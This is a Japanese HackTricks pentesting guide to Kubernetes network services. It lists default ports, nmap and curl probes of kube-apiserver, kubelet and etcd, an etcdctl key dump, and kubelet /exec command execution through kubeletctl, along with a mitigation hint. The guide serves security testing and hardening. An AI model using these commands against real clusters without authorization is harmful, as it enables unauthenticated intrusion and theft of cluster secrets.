# Kubernetesサービスの侵入テスト

<details>

<summary><strong>htARTE（HackTricks AWS Red Team Expert）</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>を通じて、ゼロからヒーローまでAWSハッキングを学ぶ</strong></a><strong>！</strong></summary>

HackTricksをサポートする他の方法：

- **HackTricksで企業を宣伝**したい場合や**HackTricksをPDFでダウンロード**したい場合は、[**SUBSCRIPTION PLANS**](https://github.com/sponsors/carlospolop)をチェックしてください！
- [**公式PEASS＆HackTricksスワッグ**](https://peass.creator-spring.com)を入手する
- [**The PEASS Family**](https://opensea.io/collection/the-peass-family)を発見し、独占的な[**NFTs**](https://opensea.io/collection/the-peass-family)のコレクションを見つける
- **💬 [Discordグループ](https://discord.gg/hRep4RUj7f)**や[**telegramグループ**](https://t.me/peass)に**参加**したり、**Twitter** 🐦で私をフォローする[**@carlospolopm**](https://twitter.com/carlospolopm)**。**
- **ハッキングテクニックを共有するために、[**HackTricks**](https://github.com/carlospolop/hacktricks)と[**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud)のGitHubリポジトリにPRを提出してください。**

</details>

Kubernetesはいくつかの**特定のネットワークサービス**を使用しており、これらは**インターネットに公開されているか**、**1つのポッドを侵害した後の内部ネットワーク**に存在する可能性があります。

## OSINTを使用した公開ポッドの検出

1つの方法は、[crt.sh](https://crt.sh)で`Identity LIKE "k8s.%.com"`を検索して、Kubernetesに関連するサブドメインを見つけることです。別の方法は、githubで`"k8s.%.com"`を検索し、その文字列を含む**YAMLファイル**を検索することです。

## Kubernetesがサービスを公開する方法

Kubernetesがサービスを**公開する方法**を理解することは役立つかもしれません：

{% content-ref url="exposing-services-in-kubernetes.md" %}
[exposing-services-in-kubernetes.md](exposing-services-in-kubernetes.md)
{% endcontent-ref %}

## ポートスキャンを使用した公開ポッドの検出

Kubernetesクラスターで次のポートが開いている可能性があります：

| ポート            | プロセス        | 説明                                                            |
| --------------- | -------------- | ---------------------------------------------------------------------- |
| 443/TCP         | kube-apiserver | Kubernetes APIポート                                                    |
| 2379/TCP        | etcd           |                                                                        |
| 6666/TCP        | etcd           | etcd                                                                   |
| 4194/TCP        | cAdvisor       | コンテナメトリクス                                                      |
| 6443/TCP        | kube-apiserver | Kubernetes APIポート                                                    |
| 8443/TCP        | kube-apiserver | Minikube APIポート                                                      |
| 8080/TCP        | kube-apiserver | インセキュアAPIポート                                                      |
| 10250/TCP       | kubelet        | フルモードアクセスを許可するHTTPS API                                |
| 10255/TCP       | kubelet        | 認証なしの読み取り専用HTTPポート：ポッド、実行中のポッド、ノードの状態 |
| 10256/TCP       | kube-proxy     | Kube Proxyヘルスチェックサーバ                                         |
| 9099/TCP        | calico-felix   | Calicoのヘルスチェックサーバ                                         |
| 6782-4/TCP      | weave          | メトリクスとエンドポイント                                                  |
| 30000-32767/TCP | NodePort       | サービスへのプロキシ                                                  |
| 44134/TCP       | Tiller         | Helmサービスリスニング                                                 |

### Nmap

{% code overflow="wrap" %}
```bash
nmap -n -T4 -p 443,2379,6666,4194,6443,8443,8080,10250,10255,10256,9099,6782-6784,30000-32767,44134 <pod_ipaddress>/16
```
{% endcode %}

### Kube-apiserver

これは、通常、管理者がツール **`kubectl`** を使用してやり取りする **API Kubernetesサービス** です。

**一般的なポート: 6443と443** ですが、minikubeでは8443、セキュリティの脆弱性として8080も使用されます。
```
curl -k https://<IP Address>:(8|6)443/swaggerapi
curl -k https://<IP Address>:(8|6)443/healthz
curl -k https://<IP Address>:(8|6)443/api/v1
```
**以下のページをチェックして、このサービスと通信して機密データを取得し、機密なアクションを実行する方法を学んでください:**

{% content-ref url="kubernetes-enumeration.md" %}
[kubernetes-enumeration.md](kubernetes-enumeration.md)
{% endcontent-ref %}

### Kubelet API

このサービスは**クラスター内のすべてのノードで実行**されます。これは**ノード**内のポッドを**制御**するサービスです。**kube-apiserver**と通信します。

このサービスが公開されている場合、**認証されていないRCE**を見つけた可能性があります。

#### Kubelet API
```
curl -k https://<IP address>:10250/metrics
curl -k https://<IP address>:10250/pods
```
もしレスポンスが `Unauthorized` であれば、認証が必要です。

ノードをリストできる場合は、次のコマンドで kubelet エンドポイントのリストを取得できます:
```bash
kubectl get nodes -o custom-columns='IP:.status.addresses[0].address,KUBELET_PORT:.status.daemonEndpoints.kubeletEndpoint.Port' | grep -v KUBELET_PORT | while IFS='' read -r node; do
ip=$(echo $node | awk '{print $1}')
port=$(echo $node | awk '{print $2}')
echo "curl -k --max-time 30 https://$ip:$port/pods"
echo "curl -k --max-time 30 https://$ip:2379/version" #Check  also for etcd
done
```
#### kubelet（読み取り専用）
```
curl -k https://<IP Address>:10255
http://<external-IP>:10255/pods
```
### etcd API
```
curl -k https://<IP address>:2379
curl -k https://<IP address>:2379/version
etcdctl --endpoints=http://<MASTER-IP>:2379 get / --prefix --keys-only
```
### Tiller

### ティラー
```
helm --host tiller-deploy.kube-system:44134 version
```
あなたはこのサービスを悪用して、Kubernetes内で特権を昇格させることができます：

### cAdvisor

メトリクスを収集するために役立つサービスです。
```
curl -k https://<IP Address>:4194
```
### NodePort

**NodePort**を介してポートがすべてのノードで公開されると、同じポートがすべてのノードで開かれ、トラフィックが宣言された**Service**にプロキシされます。デフォルトでは、このポートは**30000-32767の範囲**にあります。したがって、これらのポートを介して新しい未チェックのサービスにアクセスできる可能性があります。
```
sudo nmap -sS -p 30000-32767 <IP>
```
## 脆弱なミスコンフィギュレーション

### Kube-apiserverの匿名アクセス

**kube-apiserver APIエンドポイントへの匿名アクセスは許可されていません**。ただし、いくつかのエンドポイントをチェックできます：

![](https://www.cyberark.com/wp-content/uploads/2019/09/Kube-Pen-2-fig-5.png)

### **ETCDの匿名アクセスのチェック**

ETCDにはクラスタのシークレット、構成ファイルなどの**機密データ**が格納されています。**デフォルト**では、ETCDには**匿名でアクセスできません**が、常にチェックすることが良いでしょう。

ETCDに匿名でアクセスできる場合は、[**etcdctl**](https://github.com/etcd-io/etcd/blob/master/etcdctl/READMEv2.md) **ツール**を使用する必要があります。次のコマンドは格納されているすべてのキーを取得します：
```
etcdctl --endpoints=http://<MASTER-IP>:2379 get / --prefix --keys-only
```
### **Kubelet RCE**

[**Kubeletのドキュメント**](https://kubernetes.io/docs/reference/command-line-tools-reference/kubelet/)によると、**デフォルトではサービスへの匿名アクセスが許可**されています：

> Kubeletサーバーへの匿名リクエストを有効にします。他の認証方法で拒否されないリクエストは匿名リクエストとして扱われます。匿名リクエストのユーザー名は `system:anonymous` で、グループ名は `system:unauthenticated` です。

**Kubelet APIの認証と認可**の仕組みをよりよく理解するには、このページを参照してください：

{% content-ref url="../kubernetes-pentesting/pentesting-kubernetes-services/kubelet-authentication-and-authorization.md" %}
[kubelet-authentication-and-authorization.md](../kubernetes-pentesting/pentesting-kubernetes-services/kubelet-authentication-and-authorization.md)
{% endcontent-ref %}

**Kubelet**サービスの**APIは文書化されていません**が、ソースコードはこちらで見つけることができ、公開されているエンドポイントを見つけるのは次のように**実行するだけ**です：
```bash
curl -s https://raw.githubusercontent.com/kubernetes/kubernetes/master/pkg/kubelet/server/server.go | grep 'Path("/'

Path("/pods").
Path("/run")
Path("/exec")
Path("/attach")
Path("/portForward")
Path("/containerLogs")
Path("/runningpods/").
```
すべて興味深いです。

[Kubeletctl](https://github.com/cyberark/kubeletctl)ツールを使用して、Kubeletsとそれらのエンドポイントとやり取りすることができます。

#### /pods

このエンドポイントは、ポッドとそれらのコンテナをリストします。
```bash
kubeletctl pods
```
#### /exec

このエンドポイントを使用すると、非常に簡単に任意のコンテナ内でコードを実行できます：
```bash
kubeletctl exec [command]
```
{% hint style="info" %}
この攻撃を回避するためには、_**kubelet**_ サービスを `--anonymous-auth false` オプションで実行し、サービスをネットワークレベルで分離する必要があります。
{% endhint %}

### **Kubelet (読み取り専用ポート) 情報漏洩のチェック**

**kubelet read-only port** が公開されると、認可されていない者によって API から情報を取得される可能性が生じます。このポートの公開は、**クラスター構成要素**のさまざまな情報が漏洩する可能性があります。情報には **ポッド名、内部ファイルの場所、その他の構成** などが含まれます。これらの情報は重要ではないかもしれませんが、その公開はセキュリティリスクを引き起こす可能性があり、避けるべきです。

この脆弱性が悪用される例として、リモート攻撃者が特定の URL にアクセスすることが挙げられます。`http://<external-IP>:10255/pods` に移動することで、攻撃者は kubelet から機密情報を取得する可能性があります:

![https://www.cyberark.com/wp-content/uploads/2019/09/KUbe-Pen-2-fig-6.png](https://www.cyberark.com/wp-content/uploads/2019/09/KUbe-Pen-2-fig-6.png)

## 参考文献

{% embed url="https://www.cyberark.com/resources/threat-research-blog/kubernetes-pentest-methodology-part-2" %}

{% embed url="https://labs.f-secure.com/blog/attacking-kubernetes-through-kubelet" %}

<details>

<summary><strong>ゼロからヒーローまでのAWSハッキングを学ぶ</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong>!</strong></summary>

HackTricks をサポートする他の方法:

* **HackTricks で企業を宣伝したい** または **HackTricks を PDF でダウンロードしたい** 場合は [**SUBSCRIPTION PLANS**](https://github.com/sponsors/carlospolop) をチェックしてください！
* [**公式PEASS＆HackTricksグッズ**](https://peass.creator-spring.com)を入手する
* [**The PEASS Family**](https://opensea.io/collection/the-peass-family) を発見し、独占的な [**NFTs**](https://opensea.io/collection/the-peass-family) のコレクションを見つける
* 💬 [**Discord グループ**](https://discord.gg/hRep4RUj7f) に参加するか、[**telegram グループ**](https://t.me/peass) に参加するか、**Twitter** 🐦 [**@carlospolopm**](https://twitter.com/carlospolopm) をフォローする
* **ハッキングトリックを共有するために** [**HackTricks**](https://github.com/carlospolop/hacktricks) と [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) の GitHub リポジトリに PR を提出する

</details>
